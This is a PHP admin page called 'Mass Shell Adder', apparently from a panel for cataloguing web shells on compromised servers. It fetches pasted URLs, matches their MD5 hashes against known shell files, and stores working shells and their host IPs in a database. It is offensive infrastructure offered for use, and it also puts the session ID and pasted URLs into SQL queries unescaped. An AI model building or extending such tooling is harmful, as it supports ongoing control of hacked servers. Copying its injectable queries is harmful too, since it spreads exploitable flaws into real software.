<?php
session_start();
include('includes/db.php');
if(!isset($_SESSION['SESS_MEMBER_ID']) || (trim($_SESSION['SESS_MEMBER_ID'])=='')) {
	header("location: index.php");
	exit();
}
$query = "SELECT * FROM users WHERE id={$_SESSION['SESS_MEMBER_ID']}";
$result = mysql_query($query);
$row = mysql_fetch_array($result, MYSQL_ASSOC);
$staff = $row['staff'];

if ($staff !== 'admin'){
	exit();
}
include('_top.php');
set_time_limit(0);
ini_set('default_socket_timeout', 20); 

if (isset($_POST['shell'])) {
	if (!empty($_POST['shells_box'])) {
		$shells = $_POST['shells_box'];
		$urls = explode("\n", $shells);
		foreach ($urls as $url) {
			$theurl = trim($url);
			$parseURL = parse_url($theurl);
			$host = @gethostbyname($parseURL['host']);
			$contents = @file_get_contents($theurl);
			$md5file = md5($contents);
			$timenow = time();
			$failed = 0;
			$success = 0;
	
			$sql = "SELECT id FROM shells WHERE host='".mysql_real_escape_string($host)."'";
			$query = mysql_query($sql) or die(mysql_error());
			$count = mysql_num_rows($query);
	 
			if (!$contents) {
				echo 'Nope, check your link. Theres an error with ' . $url . '<br />';
				$failed = $failed + 1;
			}else if($count >= "1"){
				echo "This server is already in the database: " . $url . "<br />";
				$failed = $failed + 1;
			}else if (($md5file == '96a0cec80eb773687ca28840ecc67ca1')
				OR ($md5file == '04b639f439613ead7c21370c32630cda')
				OR ($md5file == 'cc7819055cde3194bb3b136bad5cf58d')
				OR ($md5file == 'f5d3611d722ac0a3c44ef85cc071e470')
				OR ($md5file == 'c836973a6a8cd32f27bdd08893830edd')
				OR ($md5file == 'd41d8cd98f00b204e9800998ecf8427e')){
				$sql_insert="INSERT INTO shells (url, status, hash, host, lastchecked)VALUES ('$theurl', 'up', '$md5file', '$host', '$timenow')";
				mysql_query($sql_insert);
				$success = $success + 1;
			} else { 
			echo 'Incorrect file: ' . $url . '<br />'; 
			$failed = $failed + 1;
			}
		}
		echo 'Failed: ' . $failed . '<br />Successful: ' . $success;
	}
}


?>

 <form name="massshell" action="" method="post">
<table width="60%" align="center" class="table">
  <tr>
    <td colspan="1" class="head" align="center" valign="middle"><strong>Mass Shell Adder</strong></td>
  </tr>
  <tr>
    <td colspan="1" align="center" class="cell" valign="middle"><textarea class="textbox" name="shells_box" cols="50" rows="50" id="notes_box"/>
</textarea></td>
  </tr>
  <tr>
	<td colspan="1" class="cell" valign="right" align="right"><input type="submit" name="shell" class="button" value="Add"></td>
  </tr>
  </table></form>